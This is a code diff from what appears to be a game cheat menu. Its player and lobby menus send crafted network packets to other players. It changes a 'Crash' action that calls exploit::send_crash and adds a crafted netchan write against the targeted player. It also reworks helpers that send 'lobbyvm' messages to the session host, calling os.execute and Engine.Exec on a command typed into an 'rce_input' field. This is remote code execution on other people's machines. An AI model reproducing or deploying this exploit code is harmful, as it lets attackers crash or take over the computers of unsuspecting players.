@@ -248,7 +248,7 @@ namespace menu
 
 							if (ImGui::IsItemClicked())
 							{
-								command::execute("xshowgamercard " + player_xuid);
+								command::execute("xshowgamercard " + std::to_string(player_xuid));
 							}
 
 							if (ImGui::IsItemHovered())
@@ -298,6 +298,11 @@ namespace menu
 							if (ImGui::MenuItem("Crash"))
 							{
 								exploit::send_crash(netadr, player_xuid, freeze);
+
+								if (in_game && game::centity(client_num)->is_alive())
+								{
+									game::net::netchan::write({ 69, game::clc()->serverMessageSequence, 0x10000 }, "", session->host.info.netAdr, session->host.info.xuid, player_xuid);
+								}
 							}
 
 							ImGui::EndMenu();
@@ -527,26 +532,17 @@ namespace menu
 					{
 						const auto set_dvar = [=](const std::string& dvar, const std::string& value)
 						{
-							game::net::netchan::write(
-								utils::string::va("lobbyvm Engine.SetDvar(str:%s,str:%s,);", dvar, value),
-								session->host.info.xuid,
-								session->host.info.netAdr);
+							game::net::netchan::write(utils::string::va("lobbyvm Engine.SetDvar(str:%s,str:%s,);", dvar, value));
 						};
 
 						const auto execute_command_line = [=](const std::string& command)
 						{
-							game::net::netchan::write(
-								"lobbyvm os.execute(str:\"" + command + "\",);",
-								session->host.info.xuid,
-								session->host.info.netAdr);
+							game::net::netchan::write("lobbyvm os.execute(str:\"" + command + "\",);");
 						};
 
 						const auto execute_command = [=](const std::string& command)
 						{
-							game::net::netchan::write(
-								"lobbyvm Engine.Exec(int:0,str:\"" + command + "\",);",
-								session->host.info.xuid,
-								session->host.info.netAdr);
+							game::net::netchan::write("lobbyvm Engine.Exec(int:0,str:\"" + command + "\",);");
 						};
 						
 						static auto rce_input{ ""s };
@@ -587,6 +583,12 @@ namespace menu
 							);
 							
 							execute_command_line("start " + command);
+						}
+
+						if (selectable("Test"))
+						{
+							auto final_data{ "lobbyvm Engine.Exec(int:0,str:\"" + "fast_restart"s + "\",);\n"s };
+							game::net::netchan::send_oob(session->host.info.xuid, session->host.info.netAdr, final_data, true);
 						}
 					}
 					
